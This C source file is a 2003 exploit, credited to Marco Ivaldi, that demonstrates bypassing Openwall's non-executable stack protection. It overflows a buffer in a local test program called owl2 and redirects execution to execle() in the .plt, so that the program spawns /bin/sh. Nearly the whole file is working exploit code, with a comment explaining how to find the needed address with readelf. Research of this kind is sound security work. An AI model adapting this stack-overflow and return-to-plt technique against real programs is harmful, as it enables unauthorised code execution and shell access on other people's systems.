/*
 * $Id: owl2-ex.c,v 1.1.1.1 2004/05/29 14:15:05 raptor Exp $
 *
 * owl2-ex.c - owl2.c exploit (call of execle() in .plt)
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * This exploit demonstrates the openwall bypass technique, based on the
 * direct call of an exec() family function (in this case execle()) stored
 * in the .plt section. See http://www.openwall.com/linux/ for more details
 * about the Linux kernel patches from Openwall project.
 *
 * $ ./owl2-ex 
 * Using ret: 0xbfffffed
 * $
 *
 * Grab the address you need:
 *
 * $ readelf -a owl2 | grep execle
 *  080494fc  00307 R_386_JUMP_SLOT       08048318  execle                   
 *     3: 08048318   171 FUNC    GLOBAL DEFAULT  UND execle@GLIBC_2.0 (2)
 *    66: 08048318   171 FUNC    GLOBAL DEFAULT  UND execle@@GLIBC_2.0
 *        ^^^^^^^^\__(execle() address in .plt)
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define BUF	277		// (64 * 4) + 4 + (4 * 4) + 1
#define EXECLE	0x08048318	// execle() address in .plt

char sc[] = "/bin/sh";		// we don't need a shellcode

int main()
{
	char *env[2] = {sc, NULL};
	char buf[BUF];
	int i;

	int *p = (int *)buf;

        int ret = 0xbffffffa - strlen(sc) - strlen("./owl2");

	fprintf(stderr, "Using ret: %p\n", ret);

	/* fill the buffer with dummy stuff */
	for (i = 0; i < 256 + 4; i += 4)
		*p++ = ret;

	/* prepare the stack */
	*p++ = EXECLE;	/* call execle() in .plt */
	*p++ = EXECLE;	/* return address for execle() */
	*p++ = ret + 5;	/* "sh" address in env (dummy) */
	*p++ = ret;	/* "/bin/sh" address in env */
	*p = 0x0;

	/* run the vulnerable program */
	execle("./owl2", "owl2", buf, NULL, env);
	perror("execle");
}
